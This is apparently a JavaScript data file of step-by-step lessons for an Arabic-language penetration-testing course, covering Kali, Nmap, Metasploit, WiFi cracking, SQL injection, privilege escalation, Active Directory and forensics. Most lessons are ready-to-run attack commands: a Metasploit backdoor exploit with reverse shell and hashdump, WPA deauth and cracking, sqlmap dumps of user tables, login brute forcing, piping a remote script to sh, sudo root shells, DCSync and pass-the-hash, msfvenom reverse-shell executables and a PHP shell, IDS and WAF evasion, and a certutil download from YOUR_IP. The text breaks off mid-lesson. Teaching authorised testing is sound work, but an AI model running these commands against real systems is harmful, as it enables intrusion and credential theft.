// ============================================================
// LESSON STEPS - خطوات التنفيذ لكل درس
// ============================================================
window.LESSON_STEPS = [

// ─── درس 1: مقدمة إلى Kali Linux ───────────────────────────
{
  id: 101, icon: '🐉', title: 'تثبيت Kali Linux',
  desc: 'خطوات تثبيت وإعداد Kali Linux خطوة بخطوة.', difficulty: 'easy', type: 'Setup', time: '30-60 دقيقة',
  steps: [
    { title: 'تحميل Kali Linux', desc: 'حمّل أحدث إصدار من الموقع الرسمي.',
      commands: [
        { cmd: 'wget https://cdimage.kali.org/kali-2024.3/kali-linux-2024.3-installer-amd64.iso', note: 'تحميل ISO رسمي' },
        { cmd: 'sha256sum kali-linux-2024.3-installer-amd64.iso', note: 'التحقق من سلامة الملف' }
      ], tip: 'استخدم الإصدار Installer للتثبيت الكامل' },
    { title: 'إنشاء USB Bootable', desc: 'احرق الـ ISO على USB.',
      commands: [
        { cmd: 'sudo dd if=kali-linux.iso of=/dev/sdb bs=4M status=progress oflag=sync', note: 'تحذير: تأكد من /dev/sdb' }
      ], warning: 'تأكد من اختيار القرص الصحيح وإلا ستخسر بياناتك' },
    { title: 'إعداد VirtualBox', desc: 'أنشئ VM جديد بإعدادات مناسبة.',
      commands: [
        { cmd: '# New VM:\n# Type: Linux\n# Version: Debian 64-bit\n# RAM: 4096 MB\n# Storage: 50 GB', note: 'الإعدادات المُوصى بها' }
      ], tip: 'خصص على الأقل 4GB RAM للعمل المريح' },
    { title: 'تحديث النظام بعد التثبيت', desc: 'أول أمر بعد التثبيت هو التحديث.',
      commands: [
        { cmd: 'sudo apt update && sudo apt full-upgrade -y', note: 'تحديث كامل للنظام' },
        { cmd: 'sudo apt install -y kali-linux-default', note: 'تثبيت أدوات Kali الأساسية' },
        { cmd: 'sudo apt autoremove -y', note: 'تنظيف الحزم غير الضرورية' }
      ] }
  ]
},

// ─── درس 2: أوامر Linux الأساسية ───────────────────────────
{
  id: 102, icon: '🐧', title: 'أوامر Linux الأساسية',
  desc: 'تطبيق عملي على أوامر Linux الضرورية.', difficulty: 'easy', type: 'Linux', time: '30-45 دقيقة',
  steps: [
    { title: 'التنقل في نظام الملفات', desc: 'تعلم cd وls وpwd.',
      commands: [
        { cmd: 'pwd', note: 'عرض المجلد الحالي' },
        { cmd: 'ls -la', note: 'عرض جميع الملفات مع التفاصيل' },
        { cmd: 'cd /home && mkdir -p pentest/{recon,scans,exploits,reports}', note: 'إنشاء هيكل مجلدات للمشروع' }
      ] },
    { title: 'إدارة الملفات', desc: 'نسخ ونقل وحذف الملفات.',
      commands: [
        { cmd: 'cp file.txt backup.txt', note: 'نسخ ملف' },
        { cmd: 'mv file.txt newname.txt', note: 'إعادة تسمية أو نقل' },
        { cmd: 'rm -rf old_folder/', note: 'حذف مجلد كاملاً' }
      ], warning: 'rm -rf لا يوجد تراجع - تأكد قبل التنفيذ' },
    { title: 'البحث والفلترة', desc: 'grep وfind للبحث في النظام.',
      commands: [
        { cmd: 'grep -r "password" /var/log/', note: 'البحث عن كلمة في ملفات' },
        { cmd: 'find / -name "*.conf" 2>/dev/null', note: 'إيجاد ملفات الإعدادات' },
        { cmd: 'cat /etc/passwd | grep -v nologin | awk -F: \'{print $1}\'', note: 'عرض المستخدمين الفعليين' }
      ] },
    { title: 'إدارة العمليات والشبكة', desc: 'ps وnetstat لفهم النظام.',
      commands: [
        { cmd: 'ps aux | grep root', note: 'العمليات التي تعمل بـ root' },
        { cmd: 'ss -tulnp', note: 'المنافذ المفتوحة والخدمات' },
        { cmd: 'ip addr show', note: 'عناوين IP للواجهات' }
      ] }
  ]
},

// ─── درس 3: Nmap ────────────────────────────────────────────
{
  id: 103, icon: '🔍', title: 'المسح بـ Nmap',
  desc: 'إتقان Nmap من الأساسيات للمتقدم.', difficulty: 'easy', type: 'Scanning', time: '45-60 دقيقة',
  steps: [
    { title: 'اكتشاف الأجهزة الحية', desc: 'اعرف ما هو موجود في الشبكة.',
      commands: [
        { cmd: 'nmap -sn 192.168.1.0/24', note: 'اكتشاف الأجهزة بدون مسح منافذ' },
        { cmd: 'nmap -sn 192.168.1.0/24 -oG alive.txt', note: 'حفظ النتائج' }
      ], tip: 'غيّر 192.168.1.0/24 لشبكتك الفعلية' },
    { title: 'مسح المنافذ الأساسي', desc: 'اكتشف المنافذ المفتوحة.',
      commands: [
        { cmd: 'nmap 192.168.1.10', note: 'مسح أشهر 1000 منفذ' },
        { cmd: 'nmap -p- --min-rate 5000 192.168.1.10', note: 'مسح جميع المنافذ بسرعة' },
        { cmd: 'nmap -p 22,80,443,3306 192.168.1.10', note: 'مسح منافذ محددة' }
      ] },
    { title: 'اكتشاف الخدمات والإصدارات', desc: 'تعرف على ما يعمل على كل منفذ.',
      commands: [
        { cmd: 'nmap -sV -sC 192.168.1.10', note: 'كشف الإصدارات + سكريبتات افتراضية' },
        { cmd: 'nmap -A 192.168.1.10', note: 'فحص شامل: OS + Services + Scripts' }
      ] },
    { title: 'فحص الثغرات وحفظ النتائج', desc: 'استخدم NSE Scripts وحفظ التقرير.',
      commands: [
        { cmd: 'nmap --script=vuln 192.168.1.10', note: 'فحص الثغرات المعروفة' },
        { cmd: 'nmap -sV -sC 192.168.1.10 -oA scan_report', note: 'حفظ بجميع الصيغ' }
      ], warning: 'هذا المسح يترك أثراً في اللوغات - استخدمه على أنظمة مرخصة فقط' }
  ]
},

// ─── درس 4: Metasploit ──────────────────────────────────────
{
  id: 104, icon: '💥', title: 'Metasploit Framework',
  desc: 'البداية الصحيحة مع Metasploit.', difficulty: 'intermediate', type: 'Exploitation', time: '60-90 دقيقة',
  steps: [
    { title: 'تشغيل Metasploit', desc: 'تهيئة قاعدة البيانات وتشغيل MSF.',
      commands: [
        { cmd: 'systemctl start postgresql', note: 'تشغيل قاعدة البيانات' },
        { cmd: 'msfdb init', note: 'تهيئة قاعدة بيانات Metasploit' },
        { cmd: 'msfconsole -q', note: 'تشغيل Metasploit بدون banner' }
      ] },
    { title: 'البحث واختيار Exploit', desc: 'ابحث عن exploit مناسب.',
      commands: [
        { cmd: 'search type:exploit name:vsftpd', note: 'البحث عن exploits لـ vsftpd' },
        { cmd: 'use exploit/unix/ftp/vsftpd_234_backdoor', note: 'اختيار الـ exploit' },
        { cmd: 'show options', note: 'عرض الخيارات المطلوبة' },
        { cmd: 'set RHOSTS 192.168.1.10', note: 'تحديد الهدف' }
      ] },
    { title: 'اختيار Payload وتشغيل الهجوم', desc: 'اختر الـ payload ونفّذ.',
      commands: [
        { cmd: 'show payloads', note: 'عرض الـ payloads المتاحة' },
        { cmd: 'set PAYLOAD linux/x86/shell/reverse_tcp', note: 'اختيار reverse shell' },
        { cmd: 'set LHOST 192.168.1.100', note: 'IP جهازك' },
        { cmd: 'run', note: 'تنفيذ الهجوم' }
      ] },
    { title: 'التعامل مع Meterpreter', desc: 'استخدام Meterpreter بعد الاختراق.',
      commands: [
        { cmd: 'sysinfo', note: 'معلومات النظام المخترق' },
        { cmd: 'getuid', note: 'المستخدم الحالي' },
        { cmd: 'hashdump', note: 'استخراج كلمات المرور' },
        { cmd: 'shell', note: 'الدخول لـ shell مباشر' }
      ] }
  ]
},

// ─── درس 5: WiFi Security ───────────────────────────────────
{
  id: 105, icon: '📡', title: 'اختبار أمان WiFi',
  desc: 'فحص شبكات WiFi واختبار WPA/WPA2.', difficulty: 'intermediate', type: 'Wireless', time: '60-90 دقيقة',
  steps: [
    { title: 'تفعيل Monitor Mode', desc: 'حوّل الكرت لوضع المراقبة.',
      commands: [
        { cmd: 'airmon-ng check kill', note: 'إيقاف العمليات المتعارضة' },
        { cmd: 'airmon-ng start wlan0', note: 'تفعيل Monitor Mode' },
        { cmd: 'iwconfig', note: 'التحقق من تفعيل wlan0mon' }
      ] },
    { title: 'مسح الشبكات', desc: 'اكتشف الشبكات المجاورة.',
      commands: [
        { cmd: 'airodump-ng wlan0mon', note: 'مسح جميع شبكات WiFi' }
      ], tip: 'سجّل BSSID والقناة للشبكة المستهدفة' },
    { title: 'التقاط WPA Handshake', desc: 'استهدف شبكة واحدة وانتظر الـ Handshake.',
      commands: [
        { cmd: 'airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w handshake wlan0mon', note: 'التقاط حزم الشبكة المستهدفة' },
        { cmd: 'aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon', note: 'فصل العملاء لإعادة الـ Handshake' }
      ], warning: 'استخدم فقط على شبكاتك الخاصة أو بإذن كتابي' },
    { title: 'كسر كلمة المرور', desc: 'استخدم قاموس لكسر الـ Handshake.',
      commands: [
        { cmd: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap', note: 'كسر WPA بقاموس rockyou' },
        { cmd: 'hcxpcapngtool -o hash.hc22000 handshake-01.cap && hashcat -m 22000 hash.hc22000 rockyou.txt', note: 'كسر أسرع بـ GPU مع hashcat' }
      ] },
    { title: 'إيقاف Monitor Mode', desc: 'أعد الكرت لوضعه الطبيعي.',
      commands: [
        { cmd: 'airmon-ng stop wlan0mon', note: 'إيقاف Monitor Mode' },
        { cmd: 'systemctl restart NetworkManager', note: 'استعادة الاتصال بالإنترنت' }
      ] }
  ]
},

// ─── درس 6: Web App Testing ─────────────────────────────────
{
  id: 106, icon: '🌐', title: 'اختبار تطبيقات الويب',
  desc: 'منهجية OWASP Top 10 لاختبار الويب.', difficulty: 'intermediate', type: 'Web', time: '60-120 دقيقة',
  steps: [
    { title: 'الاستطلاع وجمع المعلومات', desc: 'اعرف التقنيات والمجلدات المخفية.',
      commands: [
        { cmd: 'whatweb http://target.com', note: 'اكتشاف تقنيات الموقع' },
        { cmd: 'gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt', note: 'فحص المجلدات المخفية' },
        { cmd: 'nikto -h http://target.com', note: 'فحص شامل للثغرات الشائعة' }
      ] },
    { title: 'إعداد Burp Suite', desc: 'اعترض الطلبات بين المتصفح والخادم.',
      commands: [
        { cmd: 'burpsuite &', note: 'تشغيل Burp Suite على 127.0.0.1:8080' }
      ], tip: 'اضبط Firefox: Settings > Network > Proxy: 127.0.0.1:8080 ثم ثبّت Burp CA Certificate' },
    { title: 'اختبار SQL Injection', desc: 'ابحث عن ثغرات حقن SQL.',
      commands: [
        { cmd: 'sqlmap -u "http://target.com/page.php?id=1" --dbs --batch', note: 'اكتشاف قواعد البيانات' },
        { cmd: 'sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump', note: 'استخراج بيانات المستخدمين' }
      ] },
    { title: 'اختبار XSS', desc: 'ابحث عن ثغرات Cross-Site Scripting.',
      commands: [
        { cmd: 'xsser --url "http://target.com/search?q=test" --auto', note: 'فحص XSS تلقائي' }
      ], tip: 'جرب يدوياً: <script>alert(1)</script> في حقول الإدخال' },
    { title: 'اختبار Authentication', desc: 'اختبر نماذج تسجيل الدخول.',
      commands: [
        { cmd: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"', note: 'Brute Force تسجيل الدخول' }
      ] }
  ]
},

// ─── درس 7: Linux Privilege Escalation ──────────────────────
{
  id: 107, icon: '⬆️', title: 'رفع الصلاحيات Linux',
  desc: 'مسارات رفع الصلاحيات من user إلى root.', difficulty: 'advanced', type: 'PrivEsc', time: '60-90 دقيقة',
  steps: [
    { title: 'جمع معلومات النظام', desc: 'اجمع معلومات أساسية فور الحصول على shell.',
      commands: [
        { cmd: 'uname -a && id && whoami', note: 'معلومات النظام والمستخدم' },
        { cmd: 'cat /etc/os-release', note: 'إصدار نظام التشغيل' },
        { cmd: 'sudo -l', note: 'الأوامر المسموح بها بـ sudo' }
      ] },
    { title: 'تشغيل LinPEAS', desc: 'فحص تلقائي شامل لمسارات رفع الصلاحيات.',
      commands: [
        { cmd: 'curl -L https://linpeas.sh | sh 2>/dev/null | tee /tmp/linpeas.txt', note: 'تشغيل LinPEAS مباشرة' }
      ], tip: 'النتائج باللون الأحمر = أولوية عالية، الأصفر = جدير بالفحص' },
    { title: 'فحص SUID Binaries', desc: 'ابحث عن ملفات SUID قابلة للاستغلال.',
      commands: [
        { cmd: 'find / -perm -4000 -type f 2>/dev/null', note: 'جميع ملفات SUID' },
        { cmd: 'find / -perm -4000 -user root 2>/dev/null | xargs ls -la', note: 'SUID مملوكة لـ root' }
      ], tip: 'راجع GTFOBins.github.io لطريقة استغلال كل binary' },
    { title: 'فحص Cron Jobs', desc: 'ابحث عن مهام مجدولة قابلة للاستغلال.',
      commands: [
        { cmd: 'cat /etc/crontab', note: 'مهام cron الجذرية' },
        { cmd: 'ls -la /etc/cron.*', note: 'جميع مجلدات cron' }
      ] },
    { title: 'استغلال sudo المفتوح', desc: 'استغل أوامر sudo بدون كلمة مرور.',
      commands: [
        { cmd: 'sudo find . -exec /bin/sh \\; -quit', note: 'root shell عبر find' },
        { cmd: 'sudo vim -c \':!/bin/sh\'', note: 'root shell عبر vim' },
        { cmd: 'sudo python3 -c \'import os; os.system("/bin/bash")\'', note: 'root shell عبر python' }
      ] }
  ]
},

// ─── درس 8: Digital Forensics ───────────────────────────────
{
  id: 108, icon: '🔬', title: 'التحقيق الرقمي',
  desc: 'تحليل الأدلة الرقمية وصور الذاكرة.', difficulty: 'advanced', type: 'Forensics', time: '60-90 دقيقة',
  steps: [
    { title: 'أخذ صورة القرص', desc: 'لا تعمل على الدليل الأصلي أبداً.',
      commands: [
        { cmd: 'dd if=/dev/sda of=disk.img bs=4096 status=progress', note: 'نسخ القرص كاملاً bit-by-bit' },
        { cmd: 'md5sum /dev/sda > original.hash && md5sum disk.img > copy.hash', note: 'التحقق من سلامة النسخة' }
      ] },
    { title: 'تحليل الذاكرة بـ Volatility', desc: 'حلل RAM dump لإيجاد العمليات المشبوهة.',
      commands: [
        { cmd: 'volatility3 -f memory.dmp windows.info', note: 'معلومات النظام الأساسية' },
        { cmd: 'volatility3 -f memory.dmp windows.pslist', note: 'قائمة العمليات الجارية' },
        { cmd: 'volatility3 -f memory.dmp windows.netscan', note: 'الاتصالات الشبكية' },
        { cmd: 'volatility3 -f memory.dmp windows.malfind', note: 'الكشف عن Malware في الذاكرة' }
      ] },
    { title: 'استعادة الملفات المحذوفة', desc: 'استرجع الملفات المحذوفة بـ File Carving.',
      commands: [
        { cmd: 'foremost -i disk.img -o recovered/ -t jpg,pdf,docx', note: 'استعادة ملفات حسب النوع' },
        { cmd: 'photorec disk.img', note: 'أداة أخرى لاستعادة الملفات' }
      ] },
    { title: 'تحليل سجلات النظام', desc: 'اقرأ اللوغات لمعرفة ما حدث.',
      commands: [
        { cmd: 'grep "Failed password" /var/log/auth.log | tail -50', note: 'محاولات الدخول الفاشلة' },
        { cmd: 'last -20', note: 'آخر عمليات تسجيل الدخول' },
        { cmd: 'cat /var/log/apache2/access.log | grep "POST" | tail -30', note: 'طلبات POST على الخادم' }
      ] }
  ]
},

// ─── درس 9: Password Cracking ───────────────────────────────
{
  id: 109, icon: '🔑', title: 'كسر كلمات المرور',
  desc: 'منهجية شاملة لكسر الهاشات.', difficulty: 'intermediate', type: 'Password', time: '45-60 دقيقة',
  steps: [
    { title: 'تحديد نوع الهاش', desc: 'اعرف نوع الهاش قبل الكسر.',
      commands: [
        { cmd: 'echo "5f4dcc3b5aa765d61d8327deb882cf99" | hash-identifier', note: 'تحديد نوع الهاش' },
        { cmd: 'hashid 5f4dcc3b5aa765d61d8327deb882cf99', note: 'بديل لـ hash-identifier' }
      ] },
    { title: 'كسر بـ Hashcat', desc: 'استخدم hashcat مع قاموس rockyou.',
      commands: [
        { cmd: 'hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt', note: 'كسر MD5 (-m 0)' },
        { cmd: 'hashcat -m 1000 hash.txt rockyou.txt', note: 'كسر NTLM (-m 1000)' },
        { cmd: 'hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule', note: 'كسر مع قواعد التحويل' }
      ] },
    { title: 'كسر بـ John The Ripper', desc: 'John لكسر هاشات Linux والملفات.',
      commands: [
        { cmd: 'unshadow /etc/passwd /etc/shadow > combined.txt', note: 'دمج ملفات Linux' },
        { cmd: 'john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt', note: 'كسر هاشات Linux' },
        { cmd: 'zip2john secret.zip > zip.hash && john zip.hash --wordlist=rockyou.txt', note: 'كسر ZIP محمي' }
      ] },
    { title: 'كسر بـ Mask Attack', desc: 'استهدف أنماطاً محددة.',
      commands: [
        { cmd: 'hashcat -m 0 hash.txt -a 3 ?u?l?l?l?l?d?d?d?d', note: 'كلمة: حرف كبير + 4 صغيرة + 4 أرقام' },
        { cmd: 'hashcat -m 0 hash.txt -a 6 rockyou.txt ?d?d?d?d', note: 'Hybrid: كلمة + 4 أرقام' }
      ] }
  ]
},

// ─── درس 10: Active Directory ───────────────────────────────
{
  id: 110, icon: '🏢', title: 'اختبار Active Directory',
  desc: 'هجمات AD من الداخل: Kerberoasting وDCSync.', difficulty: 'advanced', type: 'AD', time: '90-120 دقيقة',
  steps: [
    { title: 'الاستطلاع الداخلي للـ AD', desc: 'اجمع معلومات المجال بعد الوصول الأولي.',
      commands: [
        { cmd: 'crackmapexec smb DC_IP -u user -p password --users', note: 'قائمة مستخدمي AD' },
        { cmd: 'ldapdomaindump -u "DOMAIN\\user" -p "password" ldap://DC_IP', note: 'استخراج بنية AD كاملة' }
      ] },
    { title: 'BloodHound لتحليل المسارات', desc: 'ارسم خريطة AD وابحث عن أقصر مسار للـ Admin.',
      commands: [
        { cmd: 'bloodhound-python -d corp.local -u user -p Password123 -ns DC_IP -c All', note: 'جمع بيانات BloodHound' },
        { cmd: 'neo4j start && bloodhound &', note: 'تشغيل BloodHound GUI' }
      ] },
    { title: 'Kerberoasting', desc: 'اكسر هاشات حسابات الخدمة.',
      commands: [
        { cmd: 'impacket-GetUserSPNs corp.local/user:password -outputfile kerb_hashes.txt', note: 'استخراج هاشات Kerberos' },
        { cmd: 'hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt', note: 'كسر هاشات Kerberoast' }
      ] },
    { title: 'Pass-the-Hash', desc: 'استخدم NTLM hash بدون كلمة المرور.',
      commands: [
        { cmd: 'crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH --local-auth', note: 'اختبار الـ hash على الشبكة' },
        { cmd: 'impacket-psexec corp.local/admin@192.168.1.10 -hashes :HASH', note: 'تنفيذ أوامر عن بُعد' }
      ] },
    { title: 'DCSync - سرقة جميع الهاشات', desc: 'اسرق هاشات كل مستخدمي AD.',
      commands: [
        { cmd: 'impacket-secretsdump corp.local/Administrator:Password@DC_IP', note: 'سرقة جميع الهاشات من DC' }
      ], warning: 'تتطلب صلاحيات Domain Admin أو صلاحيات DCSync مفوَّضة' }
  ]
},

// ─── درس 11: Nmap Advanced ──────────────────────────────────
{
  id: 111, icon: '🌐', title: 'Nmap المتقدم',
  desc: 'تقنيات Nmap المتقدمة والتخفي.', difficulty: 'intermediate', type: 'Scanning', time: '45-60 دقيقة',
  steps: [
    { title: 'مسح UDP والخدمات الخفية', desc: 'خدمات مهمة تعمل على UDP.',
      commands: [
        { cmd: 'sudo nmap -sU -p 53,161,500,1900 192.168.1.10', note: 'مسح منافذ UDP المهمة' },
        { cmd: 'sudo nmap -sU -sV --top-ports 100 192.168.1.10', note: 'أشهر 100 منفذ UDP' }
      ] },
    { title: 'NSE Scripts المتقدمة', desc: 'استخدم سكريبتات Nmap المتخصصة.',
      commands: [
        { cmd: 'nmap --script=http-enum 192.168.1.10', note: 'تعداد مسارات HTTP' },
        { cmd: 'nmap --script=smb-vuln-ms17-010 -p 445 192.168.1.10', note: 'فحص EternalBlue' },
        { cmd: 'nmap --script=ftp-anon -p 21 192.168.1.10', note: 'فحص FTP Anonymous' }
      ] },
    { title: 'تقنيات التخفي', desc: 'تجاوز IDS/IPS أثناء المسح.',
      commands: [
        { cmd: 'sudo nmap -sS -D RND:10 192.168.1.10', note: 'إخفاء المصدر بـ Decoys' },
        { cmd: 'nmap -f --data-length 200 -T2 192.168.1.10', note: 'تجزئة الحزم + إبطاء المسح' },
        { cmd: 'nmap --source-port 53 192.168.1.10', note: 'محاكاة حركة DNS' }
      ] }
  ]
},

// ─── درس 12: SQL Injection Advanced ─────────────────────────
{
  id: 112, icon: '💉', title: 'SQL Injection المتقدم',
  desc: 'حقن SQL يدوياً وتلقائياً.', difficulty: 'advanced', type: 'Web', time: '60-90 دقيقة',
  steps: [
    { title: 'اكتشاف SQL Injection يدوياً', desc: 'جرّب حقن الكود يدوياً أولاً.',
      commands: [
        { cmd: "curl 'http://target.com/page.php?id=1'", note: 'الاستجابة الطبيعية' },
        { cmd: "curl 'http://target.com/page.php?id=1 AND 1=1'", note: 'يجب إرجاع نفس النتيجة' },
        { cmd: "curl 'http://target.com/page.php?id=1 AND 1=2'", note: 'يجب إرجاع نتيجة مختلفة' }
      ], tip: 'الفرق بين AND 1=1 وAND 1=2 يؤكد وجود SQLi' },
    { title: 'UNION SELECT لاستخراج البيانات', desc: 'استخدم UNION لحقن استعلام إضافي.',
      commands: [
        { cmd: "curl 'http://target.com/page.php?id=-1 UNION SELECT 1,version(),database()--'", note: 'استخراج إصدار DB واسمها' },
        { cmd: "curl 'http://target.com/page.php?id=-1 UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--'", note: 'عرض أسماء الجداول' }
      ] },
    { title: 'SQLMap للاستخراج التلقائي', desc: 'أتمت عملية الاستخراج.',
      commands: [
        { cmd: "sqlmap -u 'http://target.com/page.php?id=1' --dbs --batch", note: 'عرض قواعد البيانات' },
        { cmd: "sqlmap -u 'http://target.com/page.php?id=1' -D dbname -T users --dump", note: 'استخراج جدول المستخدمين' }
      ] },
    { title: 'تجاوز WAF', desc: 'تجاوز جدران الحماية.',
      commands: [
        { cmd: 'sqlmap -u "http://target.com/?id=1" --tamper=space2comment,between --dbs', note: 'تجاوز WAF بـ Tamper Scripts' }
      ] }
  ]
},

// ─── درس 13: Burp Suite ─────────────────────────────────────
{
  id: 113, icon: '🕷️', title: 'Burp Suite الاحترافي',
  desc: 'إتقان Burp Suite لاختبار تطبيقات الويب.', difficulty: 'intermediate', type: 'Web', time: '60-90 دقيقة',
  steps: [
    { title: 'إعداد Burp Suite', desc: 'اعترض الطلبات بين المتصفح والخادم.',
      commands: [
        { cmd: 'burpsuite &', note: 'تشغيل Burp Suite' }
      ], tip: 'Firefox > Settings > Network > Manual Proxy: 127.0.0.1:8080 ثم زر http://burp لتحميل الشهادة' },
    { title: 'Intercepting الطلبات', desc: 'قاطع وعدّل الطلبات.',
      commands: [
        { cmd: '# Proxy → Intercept → ON\n# أرسل طلب من المتصفح\n# عدّل الـ parameter\n# اضغط Forward', note: 'اعتراض وتعديل طلب HTTP' }
      ] },
    { title: 'Repeater لاختبار الثغرات', desc: 'أرسل نفس الطلب مرات مع تعديلات.',
      commands: [
        { cmd: '# كليك يمين على الطلب في Proxy\n# Send to Repeater\n# عدّل وأرسل بـ Ctrl+Space', note: 'استخدام Repeater' }
      ] },
    { title: 'Intruder للـ Brute Force', desc: 'أتمت إرسال طلبات متعددة.',
      commands: [
        { cmd: '# Send to Intruder\n# Positions: حدد §username§ و§password§\n# Payloads: قائمة كلمات\n# Attack Type: Cluster Bomb\n# Start Attack', note: 'إعداد Intruder للـ Brute Force' }
      ], tip: 'انتبه لـ Response Length والـ Status Code للتمييز بين النجاح والفشل' }
  ]
},

// ─── درس 14: msfvenom Payloads ──────────────────────────────
{
  id: 114, icon: '💣', title: 'Payloads مع msfvenom',
  desc: 'إنشاء Payloads مخصصة لأنظمة مختلفة.', difficulty: 'advanced', type: 'Exploitation', time: '45-60 دقيقة',
  steps: [
    { title: 'إنشاء Payload Windows', desc: 'أنشئ EXE يفتح Reverse Shell.',
      commands: [
        { cmd: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o shell.exe', note: 'Meterpreter لـ Windows 64-bit' },
        { cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o shell32.exe', note: 'Meterpreter لـ Windows 32-bit' }
      ] },
    { title: 'إنشاء Payload Linux', desc: 'أنشئ ELF لأنظمة Linux.',
      commands: [
        { cmd: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o shell.elf', note: 'Meterpreter لـ Linux' },
        { cmd: 'chmod +x shell.elf', note: 'منح صلاحية التنفيذ' }
      ] },
    { title: 'إعداد Handler لاستقبال الاتصال', desc: 'استمع للاتصال القادم من الضحية.',
      commands: [
        { cmd: 'msfconsole -q', note: 'تشغيل Metasploit' },
        { cmd: 'use exploit/multi/handler', note: 'اختيار Handler' },
        { cmd: 'set PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.5\nset LPORT 4444\nexploit -j', note: 'إعداد وتشغيل Handler في الخلفية' }
      ] },
    { title: 'PHP Shell للاستضافة', desc: 'Shell لرفعه على خوادم الويب.',
      commands: [
        { cmd: 'msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php', note: 'PHP Meterpreter Shell' }
      ] }
  ]
},

// ─── درس 15: OSINT ──────────────────────────────────────────
{
  id: 115, icon: '🕵️', title: 'استطلاع OSINT المتقدم',
  desc: 'جمع المعلومات من المصادر المفتوحة.', difficulty: 'intermediate', type: 'Recon', time: '45-60 دقيقة',
  steps: [
    { title: 'جمع المعلومات بـ theHarvester', desc: 'اجمع إيميلات وعناوين IP.',
      commands: [
        { cmd: 'theHarvester -d target.com -b google,bing,linkedin -l 500', note: 'جمع من محركات البحث' },
        { cmd: 'theHarvester -d target.com -b all -f results.html', note: 'جمع شامل مع حفظ تقرير' }
      ] },
    { title: 'اكتشاف Subdomains', desc: 'ابحث عن النطاقات الفرعية.',
      commands: [
        { cmd: 'subfinder -d target.com -o subs.txt', note: 'اكتشاف الـ Subdomains' },
        { cmd: 'amass enum -passive -d target.com', note: 'اكتشاف أعمق بـ Amass' },
        { cmd: 'cat subs.txt | httpx -silent', note: 'التحقق من النطاقات الحية' }
      ] },
    { title: 'Shodan والأجهزة المكشوفة', desc: 'ابحث عن خوادم وأجهزة الشركة.',
      commands: [
        { cmd: 'shodan search "org:TargetCompany"', note: 'الأجهزة المرتبطة بالشركة' },
        { cmd: 'shodan host TARGET_IP', note: 'معلومات IP محدد' }
      ] },
    { title: 'Google Dorks', desc: 'ابحث عن معلومات حساسة على Google.',
      commands: [
        { cmd: '# site:target.com filetype:pdf\n# site:target.com intitle:"index of"\n# site:target.com ext:sql OR ext:env\n# "target.com" "admin" filetype:xls', note: 'Google Dorks للبحث عن ملفات حساسة' }
      ] }
  ]
},

// ─── درس 16: Wireshark ──────────────────────────────────────
{
  id: 116, icon: '🦈', title: 'تحليل الشبكات بـ Wireshark',
  desc: 'التقاط وتحليل حركة الشبكة.', difficulty: 'intermediate', type: 'Network', time: '45-60 دقيقة',
  steps: [
    { title: 'التقاط الحزم', desc: 'ابدأ تسجيل حركة الشبكة.',
      commands: [
        { cmd: 'wireshark &', note: 'تشغيل Wireshark' },
        { cmd: 'sudo tshark -i eth0 -w capture.pcap', note: 'التقاط من سطر الأوامر' }
      ] },
    { title: 'فلترة الحزم', desc: 'ركّز على الحزم المهمة.',
      commands: [
        { cmd: '# في Wireshark Display Filter:\nhttp\ntcp.port == 80\nip.addr == 192.168.1.10\nhttp.request.method == "POST"', note: 'فلاتر Wireshark الأساسية' }
      ] },
    { title: 'تحليل HTTP وسرقة البيانات', desc: 'استخرج البيانات المرسلة عبر HTTP.',
      commands: [
        { cmd: "sudo tshark -i eth0 -Y 'http.request.method == POST' -T fields -e http.host -e urlencoded-form.value", note: 'التقاط بيانات نماذج HTTP' },
        { cmd: 'tshark -r capture.pcap --export-objects http,exported/', note: 'استخراج ملفات من الحزم' }
      ] },
    { title: 'اكتشاف الهجمات', desc: 'تعرف على أنماط الهجمات في الحزم.',
      commands: [
        { cmd: '# ARP Spoofing:\narp.duplicate-address-detected\n# Nmap Scan:\ntcp.flags.syn==1 && tcp.flags.ack==0\n# Brute Force:\nhttp.response.code == 401', note: 'فلاتر اكتشاف الهجمات' }
      ] }
  ]
},

// ─── درس 17: Windows Privilege Escalation ───────────────────
{
  id: 117, icon: '👑', title: 'رفع الصلاحيات Windows',
  desc: 'رفع الصلاحيات من User إلى SYSTEM.', difficulty: 'advanced', type: 'PrivEsc', time: '60-90 دقيقة',
  steps: [
    { title: 'جمع معلومات Windows', desc: 'اجمع معلومات النظام بعد الوصول.',
      commands: [
        { cmd: 'whoami /all', note: 'المستخدم والـ Privileges' },
        { cmd: 'systeminfo', note: 'معلومات النظام الكاملة' },
        { cmd: 'net users && net localgroup administrators', note: 'المستخدمون والمدراء' }
      ] },
    { title: 'WinPEAS للفحص التلقائي', desc: 'فحص تلقائي لجميع مسارات رفع الصلاحيات.',
      commands: [
        { cmd: 'certutil.exe -urlcache -f http://YOUR_IP/winPEASx64.exe winpeas.exe\n.\\winpeas.exe', note: 'تحميل وتشغيل WinPEAS' }
      ], tip: 'النصوص الحمراء = ثغرات عالية الأولوية' },
    { title: 'AlwaysInstallElevated', desc: 'أي MSI يُثبَّت بصلاحيات SYSTEM.',
      commands: [
        { cmd: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', note: 'فحص Registry Key' },
